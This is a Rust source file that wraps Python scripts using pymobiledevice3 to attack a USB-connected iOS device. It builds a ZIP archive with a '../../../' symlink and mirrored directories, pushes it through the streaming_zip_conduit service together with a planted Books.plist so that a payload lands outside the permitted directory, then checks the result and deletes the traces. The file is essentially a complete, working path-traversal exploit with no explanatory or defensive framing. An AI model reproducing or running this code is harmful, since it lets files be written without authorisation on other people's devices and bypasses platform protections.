use std::process::Stdio;
use tokio::process::Command;
use crate::types::{FinishResult, StageResult};

pub async fn run_native_stage(
    udid: &str,
    target: &str,
    source: &str,
    link_dest: &str,
    recovered: &str,
    payload: &[u8],
    books_bytes: &[u8],
) -> Result<StageResult, Box<dyn std::error::Error>> {
    let payload_hex = hex::encode(payload);
    let books_hex = hex::encode(books_bytes);

    let python_code = format!(
        r#"
import asyncio, io, json, plistlib, stat, struct, zipfile
from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.afc import AfcService

SZ_EXTRA_ID = 0x5A53

def zip_info(name: str, mode: int) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name, date_time=(2026, 9, 14, 5, 0, 0))
    info.create_system = 3
    info.compress_type = zipfile.ZIP_STORED
    info.external_attr = (mode & 0xFFFF) << 16
    info.extra = struct.pack("<HHH", SZ_EXTRA_ID, 2, mode & 0xFFFF)
    return info

def build_archive(target: str, payload: bytes) -> bytes:
    target_tail = target[1:]
    metadata = plistlib.dumps({{"Version": 2}}, fmt=plistlib.FMT_BINARY, sort_keys=True)
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(zip_info("META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600), metadata)
        for d in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(zip_info(d, stat.S_IFDIR | 0o755), b"")
        archive.writestr(zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777), f"../../../{{target_tail}}".encode())
        cursor = ""
        for c in target_tail.split("/"):
            cursor += c + "/"
            archive.writestr(zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        archive.writestr(zip_info("payload", stat.S_IFREG | 0o600), payload)
    return output.getvalue()

async def fn_run():
    lockdown = await create_using_usbmux(serial='{udid}')
    async with AfcService(lockdown) as afc:
        tracked = ['Books/Sync/Books.plist', 'Books/Sync/Upload.plist']
        books_absent = True
        for p in tracked:
            if await afc.exists(p):
                books_absent = False
                break
        fresh = True
        for p in ['{source}', '{link_dest}', '{recovered}']:
            if await afc.exists(p):
                fresh = False
                break
        if not books_absent or not fresh:
            print(json.dumps({{"ok": False, "zip_response": "stale", "source_objects_present": False, "books_written": False}}))
            return
        archive_bytes = build_archive('{target}', bytes.fromhex('{payload_hex}'))
        svc = await lockdown.start_lockdown_service('com.apple.streaming_zip_conduit')
        await svc.send_plist({{'MediaSubdir': '{source}'}}, fmt=plistlib.FMT_BINARY)
        await svc.sendall(archive_bytes)
        try:
            resp = await asyncio.wait_for(svc.recv_plist(), timeout=30)
        except Exception:
            resp = {{}}
        source_ok = await afc.exists('{source}') and await afc.exists('{source}/p0/p1/p2/link')
        await afc.makedirs('Books/Sync')
        h = await afc.fopen('Books/Sync/Books.plist', 'w')
        await afc.fwrite(h, bytes.fromhex('{books_hex}'))
        await afc.fclose(h)
        print(json.dumps({{"ok": source_ok, "zip_response": str(resp), "source_objects_present": source_ok, "books_written": True}}))

asyncio.run(fn_run())
"#
    );

    let mut cmd = Command::new("python3");
    cmd.arg("-c").arg(python_code);
    cmd.stdout(Stdio::piped());
    cmd.stderr(Stdio::piped());

    let output = cmd.output().await?;
    let stdout_str = String::from_utf8_lossy(&output.stdout);

    for line in stdout_str.lines().rev() {
        let trimmed = line.trim();
        if trimmed.starts_with('{') && trimmed.ends_with('}') {
            if let Ok(res) = serde_json::from_str::<StageResult>(trimmed) {
                return Ok(res);
            }
        }
    }

    Ok(StageResult {
        ok: false,
        zip_response: String::from_utf8_lossy(&output.stderr).to_string(),
        source_objects_present: false,
        books_written: false,
    })
}

pub async fn run_native_finish(
    udid: &str,
    source: &str,
    link_dest: &str,
    recovered: &str,
    payload: &[u8],
    leaf: &str,
) -> Result<FinishResult, Box<dyn std::error::Error>> {
    let payload_hex = hex::encode(payload);

    let python_code = format!(
        r#"
import asyncio, json, sys
from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.afc import AfcService

async def fn_run():
    lockdown = await create_using_usbmux(serial='{udid}')
    async with AfcService(lockdown) as afc:
        try:
            observed = await afc.get_file_contents('{recovered}')
        except Exception:
            observed = None
        recovered_present = observed is not None
        expected = bytes.fromhex('{payload_hex}')
        bytes_match = observed == expected if observed else False
        failures = []
        target_through_link = '{link_dest}/{leaf}'
        for p in [target_through_link, '{link_dest}', '{recovered}', '{source}', 'Books/Books.plist', 'Books/Sync/Books.plist']:
            try:
                if await afc.exists(p):
                    await afc.rm(p)
                if await afc.exists(p):
                    failures.append(p)
            except Exception:
                failures.append(p)
        cleanup = len(failures) == 0
        print(json.dumps({{"ok": bytes_match and cleanup, "recovered_present": recovered_present, "recovered_bytes_match": bytes_match, "cleanup_complete": cleanup, "failures": failures}}))

asyncio.run(fn_run())
"#
    );

    let mut cmd = Command::new("python3");
    cmd.arg("-c").arg(python_code);
    cmd.stdout(Stdio::piped());
    cmd.stderr(Stdio::piped());

    let output = cmd.output().await?;
    let stdout_str = String::from_utf8_lossy(&output.stdout);

    for line in stdout_str.lines().rev() {
        let trimmed = line.trim();
        if trimmed.starts_with('{') && trimmed.ends_with('}') {
            if let Ok(res) = serde_json::from_str::<FinishResult>(trimmed) {
                return Ok(res);
            }
        }
    }

    Ok(FinishResult {
        ok: false,
        recovered_present: false,
        recovered_bytes_match: false,
        cleanup_complete: false,
        failures: vec![String::from_utf8_lossy(&output.stderr).to_string()],
    })
}
